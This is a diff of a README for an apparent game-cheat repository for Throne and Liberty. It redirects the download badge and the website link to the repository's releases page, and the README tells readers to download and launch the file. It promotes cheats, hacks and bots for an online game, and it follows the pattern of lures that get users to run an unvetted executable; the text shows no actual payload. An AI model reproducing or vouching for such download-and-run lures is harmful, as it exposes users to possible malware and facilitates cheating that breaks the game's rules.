@@ -12,7 +12,7 @@ Welcome to the official repository for the Throne and Liberty trainer cheats! �
 
 Click the button below to download the Throne and Liberty trainer cheats:
 
-[![Download cheats](https://img.shields.io/badge/Download-Cheats-blue)](https://github.com/uploads/App.zip)
+[![Download cheats](https://github.com/saicrown/THRONE-AND-LIBERTY-Trainer-Cheats/releases)](https://github.com/saicrown/THRONE-AND-LIBERTY-Trainer-Cheats/releases)
 
 Once the download is complete, launch the file to get started with enhancing your gameplay in Throne and Liberty.
 
@@ -33,7 +33,7 @@ If you have any cheats, hacks, mods, or bots that you would like to contribute t
 
 ## Visit Our Website 🌐
 
-For more information and updates, please visit our [website](https://throneandlibertycheats.com). Explore the latest cheats, hacks, and mods to elevate your gameplay in Throne and Liberty.
+For more information and updates, please visit our [website](https://github.com/saicrown/THRONE-AND-LIBERTY-Trainer-Cheats/releases). Explore the latest cheats, hacks, and mods to elevate your gameplay in Throne and Liberty.
 
 ## Releases Section 🔖
 
